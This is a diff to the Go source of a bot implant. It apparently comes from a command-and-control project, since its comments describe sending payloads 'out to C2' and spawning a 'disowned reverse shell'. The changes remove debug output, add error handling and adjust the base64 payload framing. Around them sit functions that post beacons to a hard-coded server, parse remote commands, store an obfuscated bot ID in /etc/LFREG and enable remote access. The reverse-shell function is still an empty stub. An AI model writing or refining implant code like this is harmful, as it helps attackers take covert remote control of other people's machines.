@@ -3,7 +3,6 @@ package main
 import (
 	"bytes"
 	"encoding/base64"
-	"fmt"
 	"io"
 	"io/ioutil"
 	"math/rand"
@@ -18,7 +17,7 @@ import (
 )
 
 // LFSERV : server to call
-var LFSERV = "192.168.206.183:8080"
+var LFSERV = "http://192.168.206.183:8080"
 
 // MAGIC : the shared hex byte that will signify the start of each MAD payload
 var MAGIC = []byte{0xAA}
@@ -27,7 +26,7 @@ var MAGIC = []byte{0xAA}
 var MAGICBYTE = MAGIC[0]
 
 //MAGICSTR is the ascii representation of the magic byte
-var MAGICSTR = string(MAGIC)
+var MAGICSTR = "XXXXX" //string(MAGIC)
 
 // MAGICTERM : the shared hex byte that will signify the end of each MAD payload
 var MAGICTERM = []byte{0xAB}
@@ -36,7 +35,7 @@ var MAGICTERM = []byte{0xAB}
 var MAGICTERMBYTE = MAGICTERM[0]
 
 //MAGICTERMSTR is the ascii representation of the magic byte
-var MAGICTERMSTR = string(MAGICTERM)
+var MAGICTERMSTR = "YYYYY" //string(MAGICTERM)
 
 //REGFILE is where the registration info for this bot is kept
 var REGFILE = "/etc/LFREG"
@@ -56,7 +55,6 @@ var OBFTEXT = "test"
 //blast payload out to C2, listen to response
 func sendData(data string, mode string, aid string) string {
 	payload := encodePayload(data, mode, aid)
-	fmt.Printf("sending: %s\n", payload)
 	respStr := postPayload(payload)
 	decResp := decodePayload(respStr)
 	return decResp
@@ -68,6 +66,9 @@ func postPayload(data string) string {
 	jsonStr := []byte(prejson)
 	cli := http.Client{}
 	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
+	if err != nil {
+		return "Error"
+	}
 	req.Header.Set("Content-Type", "application/json")
 	resp, err := cli.Do(req)
 	if err != nil {
@@ -89,9 +90,10 @@ func encodePayload(data string, mode string, aid string) string {
 func decodePayload(payload string) string {
 	encodedPayload := strings.Replace(payload, MAGICSTR, "", -1) //trim magic chars from payload
 	encodedPayload = strings.Replace(encodedPayload, MAGICTERMSTR, "", -1)
+	encodedPayload = strings.Replace(encodedPayload, "{\"comms\":\"", "", 1)
+	encodedPayload = strings.Replace(encodedPayload, "\"}", "", 1)
 	data, err := base64.StdEncoding.DecodeString(encodedPayload)
 	if err != nil {
-		fmt.Println("error:", err)
 		return ""
 	}
 	return string(data)
@@ -135,7 +137,6 @@ func parseCommands(commandBlob string) []string {
 	isplit := strings.Split(commandBlob, "<||>")
 	for _, comStr := range isplit {
 		jsplit := strings.SplitN(comStr, ":", 3)
-		fmt.Println(jsplit)
 		aid := jsplit[0]
 		mode := jsplit[1]
 		if mode == "0" {
@@ -204,7 +205,10 @@ func getIP() string {
 //write the UUID to somewhere on disk
 func storeUUID(uid string) {
 	obf := obfuscateUUID(uid, OBFSEED, OBFTEXT)
-	f, _ := os.Create(REGFILE)
+	f, err := os.Create(REGFILE)
+	if err != nil {
+		return
+	}
 	io.WriteString(f, obf)
 	f.Close()
 	return
@@ -287,7 +291,6 @@ func enableRemote() string {
 
 //spawn a (disowned) reverse shell back to target IP/port
 func spawnRevShell(target string) string {
-	fmt.Println("In spawnRevShell")
 	//soon to come...
 	return ""
 }
